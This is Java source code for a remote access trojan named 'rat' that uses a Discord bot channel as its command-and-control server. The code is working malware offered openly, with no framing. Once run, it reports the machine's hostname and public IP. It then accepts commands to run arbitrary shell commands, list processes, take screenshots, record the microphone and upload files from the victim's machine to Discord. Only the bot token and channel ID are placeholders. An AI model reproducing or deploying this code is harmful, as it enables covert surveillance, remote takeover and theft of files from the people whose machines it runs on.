package org.example;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;
import java.util.List;
import java.util.ArrayList;
import java.util.Date;
import java.text.SimpleDateFormat;
import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;
import org.json.JSONArray;
import org.json.JSONObject;

public class rat {
    private static final String TOKEN = "BOT TOKEN";
    private static final String CHANNEL_ID = "CHANNEL ID";
    private static final String API_HOST = "discord.com";
    private static final String API_URL = "https://" + API_HOST + "/api/v10/channels/" + CHANNEL_ID + "/messages";

    // list to track processed messages and avoid duplicates
    private static final List<String> processedMessageIds = new ArrayList<>();

    public static void main(String[] args) {
        try {
            String hostname = InetAddress.getLocalHost().getHostName();
            String ip = getPublicIp();
            sendMessage("📢 Connection established from: " + hostname + " (" + ip + ")");

            // get initial message to avoid processing old commands
            JSONArray initialMessages = getMessages(1);
            if (initialMessages.length() > 0) {
                processedMessageIds.add(initialMessages.getJSONObject(0).getString("id"));
            }

            // main command listening loop
            while (true) {
                JSONArray messages = getMessages(10);
                processMessages(messages);
                Thread.sleep(5000);
            }
        } catch (Exception e) {
            try {
                sendMessage("❌ Program error: " + e.getMessage());
            } catch (Exception ignored) {
            }
            e.printStackTrace();
        }
    }

    private static void processMessages(JSONArray messages) throws Exception {
        for (int i = 0; i < messages.length(); i++) {
            JSONObject msg = messages.getJSONObject(i);
            String messageId = msg.getString("id");

            if (processedMessageIds.contains(messageId)) {
                continue;
            }

            processedMessageIds.add(messageId);
            if (processedMessageIds.size() > 100) {
                processedMessageIds.remove(0);
            }

            String content = msg.getString("content").trim();

            // command execution
            if (content.startsWith("!cmd ")) {
                String command = content.substring(5);
                sendMessage("🔄 Executing: `" + command + "`");
                String output = executeCommand(command);
                if (output.length() > 1900) {
                    output = output.substring(0, 1900) + "... (truncated)";
                }
                sendMessage("```" + output + "```");
            } else if (content.equals("!info")) {
                sendMessage("ℹ️ System information:\n```" + getSystemInfo() + "```");
            } else if (content.equals("!ip")) {
                sendMessage("🌐 Public IP: " + getPublicIp());
            } else if (content.equals("!screenshot")) {
                try {
                    sendMessage("📸 Capturing screen...");
                    byte[] imgData = captureScreen();
                    sendImage(imgData, "screenshot.png");
                } catch (Exception e) {
                    sendMessage("❌ Error capturing screen: " + e.getMessage());
                }
            } else if (content.equals("!exit")) {
                sendMessage("🛑 Terminating program...");
                System.exit(0);
            }
            else if (content.equals("!processes")) {
                sendMessage("📋 Listing active processes...");
                String output;
                if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                    output = executeCommand("tasklist");
                } else {
                    output = executeCommand("ps aux");
                }
                if (output.length() > 1900) {
                    output = output.substring(0, 1900) + "... (truncated)";
                }
                sendMessage("```" + output + "```");
            }
            else if (content.startsWith("!record ")) {
                try {
                    int seconds = Integer.parseInt(content.substring(8).trim());
                    if (seconds > 0 && seconds <= 30) {
                        sendMessage("🎤 Recording audio for " + seconds + " seconds...");
                        byte[] audioData = recordAudio(seconds);
                        sendFile(audioData, "recording.wav", "audio/wav");
                        sendMessage("✅ Recording completed!");
                    } else {
                        sendMessage("⚠️ Please specify a duration between 1 and 30 seconds");
                    }
                } catch (NumberFormatException e) {
                    sendMessage("⚠️ Incorrect format. Usage: !record [seconds]");
                } catch (Exception e) {
                    sendMessage("❌ Error recording audio: " + e.getMessage());
                }
            }
            else if (content.startsWith("!download ")) {
                String filePath = content.substring(11).trim();
                try {
                    File file = new File(filePath);
                    if (file.exists() && file.isFile() && file.canRead()) {
                        if (file.length() > 8 * 1024 * 1024) {
                            sendMessage("⚠️ File is too large (max 8MB)");
                        } else {
                            sendMessage("📥 Downloading file: " + file.getName() + "...");
                            byte[] fileData = Files.readAllBytes(Paths.get(filePath));

                            String contentType = Files.probeContentType(Paths.get(filePath));
                            if (contentType == null) {
                                contentType = "application/octet-stream";
                            }

                            sendFile(fileData, file.getName(), contentType);
                            sendMessage("✅ File sent: " + file.getName());
                        }
                    } else {
                        sendMessage("❌ Cannot access file: " + filePath);
                    }
                } catch (Exception e) {
                    sendMessage("❌ Error downloading file: " + e.getMessage());
                }
            }
        }
    }

    private static JSONArray getMessages(int limit) throws IOException {
        URL url = new URL(API_URL + "?limit=" + limit);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Authorization", "Bot " + TOKEN);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        try (InputStream responseStream = conn.getInputStream();
             Scanner scanner = new Scanner(responseStream).useDelimiter("\\A")) {
            String response = scanner.hasNext() ? scanner.next() : "";
            return new JSONArray(response);
        }
    }

    private static void sendMessage(String content) throws IOException {
        URL url = new URL(API_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", "Bot " + TOKEN);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setDoOutput(true);

        JSONObject payload = new JSONObject();
        payload.put("content", content);

        try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
            os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
        }

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            try (InputStream errorStream = conn.getErrorStream();
                 Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
                String errorResponse = scanner.hasNext() ? scanner.next() : "";
                System.err.println("Error sending message: " + responseCode + " - " + errorResponse);
            }
        }
    }

    private static String executeCommand(String cmd) throws IOException {
        Process process;
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        }

        StringBuilder output = new StringBuilder();

        try (InputStream inputStream = process.getInputStream();
             Scanner scanner = new Scanner(inputStream).useDelimiter("\\A")) {
            if (scanner.hasNext()) {
                output.append(scanner.next());
            }
        }

        try (InputStream errorStream = process.getErrorStream();
             Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
            if (scanner.hasNext()) {
                output.append("\nERROR:\n").append(scanner.next());
            }
        }

        try {
            process.waitFor();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            output.append("\nCommand interrupted.");
        }

        return output.toString();
    }

    private static String getSystemInfo() {
        return "OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version") + "\n" +
                "CPU: " + System.getProperty("os.arch") + "\n" +
                "Java: " + System.getProperty("java.version") + "\n" +
                "Free memory: " + Runtime.getRuntime().freeMemory() / (1024 * 1024) + "MB\n" +
                "Total memory: " + Runtime.getRuntime().totalMemory() / (1024 * 1024) + "MB\n" +
                "Hostname: " + getHostname() + "\n" +
                "User: " + System.getProperty("user.name") + "\n" +
                "Date: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
    }

    private static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "unknown";
        }
    }

    private static String getPublicIp() throws IOException {
        URL url = new URL("https://api64.ipify.org/?format=json");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        try (InputStream responseStream = conn.getInputStream();
             Scanner scanner = new Scanner(responseStream).useDelimiter("\\A")) {
            String response = scanner.hasNext() ? scanner.next() : "";
            JSONObject json = new JSONObject(response);
            return json.getString("ip");
        }
    }

    private static byte[] captureScreen() throws Exception {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenCapture = robot.createScreenCapture(screenRect);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenCapture, "png", baos);
        return baos.toByteArray();
    }

    private static byte[] recordAudio(int seconds) throws Exception {
        AudioFormat format = new AudioFormat(44100, 16, 1, true, false);
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);

        if (!AudioSystem.isLineSupported(info)) {
            throw new Exception("Audio format not supported");
        }

        TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
        line.open(format);
        line.start();

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int bufferSize = (int) format.getSampleRate() * format.getFrameSize();
        byte[] buffer = new byte[bufferSize];

        try {
            int limit = (int) (format.getFrameRate() * seconds);
            int total = 0;

            while (total < limit) {
                int count = line.read(buffer, 0, buffer.length);
                if (count > 0) {
                    out.write(buffer, 0, count);
                    total += count;
                }
            }

            ByteArrayOutputStream wavOut = new ByteArrayOutputStream();

            writeWavHeader(wavOut, (int) format.getSampleRate(), format.getChannels(),
                    (int) format.getSampleSizeInBits(), out.size());

            out.writeTo(wavOut);

            return wavOut.toByteArray();
        } finally {
            line.stop();
            line.close();
        }
    }

    // wav file header creation for audio recording
    private static void writeWavHeader(ByteArrayOutputStream out, int sampleRate, int channels,
                                       int bitsPerSample, int dataLength) throws IOException {
        out.write("RIFF".getBytes());
        writeInt(out, 36 + dataLength);
        out.write("WAVE".getBytes());

        out.write("fmt ".getBytes());
        writeInt(out, 16);
        writeShort(out, (short) 1); 
        writeShort(out, (short) channels);
        writeInt(out, sampleRate);
        writeInt(out, sampleRate * channels * bitsPerSample / 8); 
        writeShort(out, (short) (channels * bitsPerSample / 8)); 
        writeShort(out, (short) bitsPerSample);

        out.write("data".getBytes());
        writeInt(out, dataLength);
    }

    private static void writeInt(ByteArrayOutputStream out, int value) throws IOException {
        out.write(value & 0xFF);
        out.write((value >> 8) & 0xFF);
        out.write((value >> 16) & 0xFF);
        out.write((value >> 24) & 0xFF);
    }

    private static void writeShort(ByteArrayOutputStream out, short value) throws IOException {
        out.write(value & 0xFF);
        out.write((value >> 8) & 0xFF);
    }

    private static void sendImage(byte[] imgData, String name) throws IOException {
        sendFile(imgData, name, "image/png");
    }

    // multipart file upload to dc
    private static void sendFile(byte[] data, String name, String contentType) throws IOException {
        URL url = new URL(API_URL);
        String boundary = "----BOUNDARY" + System.currentTimeMillis();

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", "Bot " + TOKEN);
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setConnectTimeout(20000);
        conn.setReadTimeout(20000);
        conn.setDoOutput(true);

        try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"content\"\r\n\r\n");
            os.writeBytes("📁 File: " + name + "\r\n");

            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + name + "\"\r\n");
            os.writeBytes("Content-Type: " + contentType + "\r\n\r\n");

            os.write(data);
            os.writeBytes("\r\n");
            os.writeBytes("--" + boundary + "--\r\n");
        }

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            try (InputStream errorStream = conn.getErrorStream();
                 Scanner scanner = new Scanner(errorStream).useDelimiter("\\A")) {
                String errorResponse = scanner.hasNext() ? scanner.next() : "";
                System.err.println("Error: " + responseCode + " - " + errorResponse);
            }
        }
    }
}
